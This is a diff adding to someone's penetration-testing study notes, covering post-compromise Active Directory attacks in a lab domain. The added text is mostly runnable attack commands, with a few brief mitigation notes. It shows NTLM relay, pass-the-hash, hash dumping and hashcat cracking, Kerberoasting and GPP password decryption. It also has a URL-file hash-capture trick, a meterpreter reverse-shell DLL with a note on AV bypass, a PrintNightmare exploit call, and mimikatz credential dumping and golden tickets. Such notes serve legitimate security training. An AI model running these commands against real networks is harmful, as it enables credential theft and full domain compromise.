@@ -313,6 +313,7 @@ add admin users - comp mangmnt
 confirm from dc
 turn on discovery and file sharing
 
+
 Initial attack vectors
 https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
 
@@ -362,6 +363,7 @@ setup relay
        python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support
 access share(\\ip)
 dumped haches(crack or pass them)
+hashcat -m 5600 hash.txt rockyou.txt --force -O
 SMB shell(tcp)
        python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support -i
        help
@@ -376,7 +378,7 @@ account tiering(limits domain admins to specific tasks)
 local admin restriction(increased service desk tickets)
 
 Gain shell access
-msf-psexec-set smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets
+msf-exploit/windows/smb/psexec-set smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets
 impacket-psexec marvel.local/fcastle:password123@192.168.57.2
 impacket-smbexec
 impacket-wmiexec
@@ -421,79 +423,223 @@ look for websites in scope if scans take too long
 default creds in printers, jenkins, etc
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Post Compromise enumeration
+
+AzureHound
+powerview(powershellmafia clone) - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+powershell -ep bypass
+       . .\PowerView.ps1
+              Get-NetDomain
+              Get-NetDomainController
+              Get-DomainPolicy
+              (Get-DomainPolicy)."system access"
+              Get-NetUser
+              Get-NetUser | select cn(more >> samaccountname, description)
+              if useraccountcontrol == 500 is admin
+              Get-UserProperty
+              Get-UserProperty -Properties pwdlastset(more >> logoncount, badpwdcount)
+              Get-NetComputer
+              Get-NetComputer -FullData
+              Get-NetComputer -FullData | select OperatingSystem
+              Get-NetGroup
+              Get-NetGroup -GroupName "Domain Admins"
+              Get-NetGroup -GroupName *admin*
+              Get-NetGroupMember -GroupName "Domain Admins"                         #admins
+              Invoke-ShareFinder                                                    #shares
+              Get-NetGPO
+              Get-NetGPO | select displayname, whenchanged
+
+Bloodhound
+apt install bloodhound
+neo4j console(noe4j:neo4j) - change pass
+bloodhound
+
+grab data with Invoke-Bloodhound, sharphound(clone BloodHoundAD)
+SharpHound.ps1(upload to windows machine)
+powershell -ep bypass
+       . .\SharpHound.ps1
+              Invoke-BloodHound -CollectionMethod All -Domain marvel.local -ZipFileName file.zip
+              move file to attacker machine
+from browser
+upload data(file)
+queries
+
+
+Post Compromise attacks
+
+pass the hash/password
+crackmapexec smb 10.0.3.0/24 -u fcastle -d marvel -p Password1
+from msf> smb/psexec > hashdump > user 500(admin) hash(second half)
+       crackmapexec smb 10.0.3.0/24 -u fcastle -H hash --local-auth
+crackmapexec smb 10.0.3.0/24 -u fcastle -d marvel -p Password1 --sam
+psexec.py marvel/fcastle:Password1@192.168.57.142(pwned) - shell
+
+dump hashes with secretsdump.py
+secretsdump.py marvel/fcastle:Password1@192.168.57.141(pwned)
+pass/crack dem hashes(NTLM-second half)
+NTLM hashes can be passed NTLMv2 cannot
+hashcat -m 1000 hash.txt rockyou.txt --force -O
+
+pass the hash attacks
+crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H hash --local-auth
+get shell
+psexec "frank castle":@192.168.57.141(pawned) -hashes hash:hash
+
+pass attack mitigation
+limit acc reuse
+       avoid local admin passwd reuse
+       disable guest/admin accs
+       limit who is admin
+strong passwords
+       long sentence > 14 chars
+       uniques words
+privilege access mangnt(PAM)
+       check in/out sensitive accs when needed
+       auto rotate passwds in check in/out
+
+Token impersonation attacks
+token - temporary keys that allow system access without providing creds eavh time you access a file.
+types - Delegate
+              for logging into a machine or RDP
+      - Impersonate
+              non-interactive such as attaching a network drive or a domain logon script
+
+token impersonation with incognito
+msf-exploit/windows/smb/psexec-set rhosts,smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets(native upload)
+       hashdump,getuid,sysinfo
+       load incognito
+       help
+       list_tokens -u
+       impersonate_token marvel\\administrator
+       shell
+       whoami
+       ctrl+c(exit)
+rev2self(if hashdump access denied)
+impersonate other users
+
+token impersonation mitigation
+limit user/group token creation perms
+account tiering
+local admin restriction
+
+Kerberoasting
+goal - get TGS and decrypt server's accnt hash
+user <> DC(Key distribution center-KDC) <> app service server(SQL,AV..)
+       provide NTLM request TGT
+       receive TGT(encrypted with krbtgt acc hash)
+       provide TGT request TGS for server(service principle name-SPN)
+       receive TGS
+              provide TGS for service(encrypted with server acc) in server account
+              use TGS for mutual authentication
+              app server send PAC validation request(optional)
+              app server receives PAC validation request(optional)
+impacket-GetUserSPNS marvel.local/fcastle:Password1 -dc-ip 192.168.52.140 -request
+copy hash
+hashcat --help | grep -i kerberos - 13100
+hashcat -m 13100 hash.txt rockyou.txt --force -O
+
+Kerberoasting mitigation
+strong passwds
+least privilege
+
+Group policy preferences(GPP)/cPassword attacks - CVE MS14-025
+-gpp allow admins to create policies using embedded creds
+-the creds are encrypted and stored in cPassword(xml doc)
+-the key was accidentally released
+-patched in MS14-025 but doesn't prevent previous ones
+https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
+powershell scripts
+msf - auxillsmb_enum_gpp
+Even without Metasploit, one can extract the cpassword value from the files on SYSVOL 
+and pass them to the gpp-decrypt tool in Kali Linux which will decrypt it:
+
+abusing GPP
+HTB - Active box
+nmap -T5 ip
+53,88,389,636 - probably a DC
+smbclient -L \\\\ip\\
+prompt off
+recurse on
+mget *
+gpp-decrypt encryptedpassword
+
+part 2
+psexec active.htb/svc_tgs:decryptedpassword@IP
+Impacket-GetUserSPNs active.htb/svc_tgs:decryptedpassword -dc-ip IP -request
+copy TGS
+hashcat -m 13100 hash.txt rockyou.txt -O
+get shell
+psexec active.htb/Administrator:TGScrackedpassword@IP
+
+URL File attacks
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
+
+html - save file to share("@anything.url")
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\attackerIP\%USERNAME%.icon
+IconIndex=1
+
+responder -I eth0 -v
+navigate to file from win machine
+relay/crack
+
+printnightmare - wins print spooler(LPE/RCE) CVE-2021-1675/CVE-2021-34527 
+https://github.com/cube0x0/CVE-2021-1675,     https://github.com/calebstewart/CVE-2021-1675
+Scanning
+       rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
+              Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+              Protocol: [MS-RPRN]: Print System Remote Protocol
+msfvenom -p windows/x64/meterprete/reverse_tcp lhost=ip lport=port -f dll > shell.dll
+obfuscate dll and AV bypass
+msfconsole
+       use multi/handler
+       set lhost,lport
+       run
+set up file share
+       Impacket-smbserver share `pwd` -smb2support
+python CVE-2021-1675.py marvel.local/fcastle:Password@IP '\\IP\share\shell.dll'
+getuid
+hashdump
+
+mimikatz - https://github.com/gentilkiwi/mimikatz  - wiki site
+view steal creds, generate kerberos tickets and leverage a tacks
+dump creds from memory, pass the hash, over pass the hash, pass the ticket, build golden ticket, silver ticket
+
+credential dumping with mimikatz
+mimikatz.exe on dc
+       privilege::debug
+       sekurlsa::logonpasswords
+       lsadump::sam  (local security authority)
+       lsadump::sam /patch
+       lsadump::lsa /patch
+
+golden ticket attacks(persistence)
+mimikatz.exe on dc
+       privilege::debug
+       lsadump::lsa /inject /name:krbtgt
+       copy sid of domain, NTLM of krbtgt account
+       kerberos::golden /User:Administrator /domain:marvel.local /sid:sidvalue /krbtgt:krbtgtNTLM /id:500 /ptt
+       misc::cmd
+       dir \\thepunisher\sharename
+       upload psexec on dc(get shell)
+       psexec.exe \\thepunisher cmd.exe
+
+abusing zerologon - CVE-2020-1472
+a vulnerability in the cryptography of Microsoft’s Netlogon process that allows an attack against Microsoft AD dc.
+Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.
+What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
+dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
+SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
+
+conclusion
+Resources for this video:
+Active Directory Security Blog: https://adsecurity.org/
+Harmj0y Blog: http://blog.harmj0y.net/
+Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
+Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
+eLS PTX: https://elearnsecurity.com/product/ecptx-certification/
 
 
 
@@ -666,6 +812,7 @@ docker start webgoat
        You are vulnerable to information leakage if you make logging and alerting events visible to a user or an attacker
 
 
+
 #Wireless penetration testing
 Wired Equivalent Privacy (WEP)
 Wi-Fi Protected Access ii (WPA2 PSK(pre shared key))
@@ -691,7 +838,7 @@ process:
 
 
 
-
+#Legal documents and report writing
 
 
 
